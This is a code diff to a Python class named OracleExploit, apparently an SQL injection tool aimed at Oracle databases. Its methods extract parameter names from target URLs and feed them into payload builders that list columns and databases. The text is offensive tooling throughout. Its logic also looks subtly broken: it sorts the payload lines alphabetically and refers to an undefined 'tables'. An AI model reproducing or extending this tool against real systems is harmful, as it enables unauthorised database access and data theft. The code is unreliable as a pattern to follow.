@@ -102,6 +102,7 @@ class OracleExploit:
     
     @staticmethod
     def db_column_exploit(urls):
+        parameter,_ = extract_parameter_name(urls)
         payload = OraclePayloads.db_column_list("id","column","table")
         rows = payload.split("\n")
         sorted_rows = sorted(rows)
@@ -125,7 +126,8 @@ class OracleExploit:
 
     @staticmethod 
     def db_column_list_exploit(urls):
-        payload = OraclePayloads.db_column_list("id","column","table")
+        parameter,_ = extract_parameter_name(urls)
+        payload = OraclePayloads.db_column_list(column=parameter,table=random.choice(tables))
         rows = payload.split("\n")
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
@@ -148,7 +150,8 @@ class OracleExploit:
 
     @staticmethod
     def oracle_injection_exploit(urls):
-        payload = OraclePayloads.oracle_injection_payload("id","column","table")
+        parameter,_ = extract_parameter_name(urls)
+        payload = OraclePayloads.oracle_injection_payload(table=random.choice(tables),column=parameter)
         rows = payload.split("\n")
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
@@ -171,7 +174,8 @@ class OracleExploit:
 
     @staticmethod
     def oracle_injection_database_list_attack(urls):
-        payload = OraclePayloads.oracle_injection_database_list("id","column","table")
+        parameter,_ = extract_parameter_name(urls)
+        payload = OraclePayloads.oracle_injection_database_list(column=parameter,table=random.choice(tables))
         rows = payload.split("\n")
         sorted_rows = sorted(rows)
         sorted_payload = "\n".join(sorted_rows)
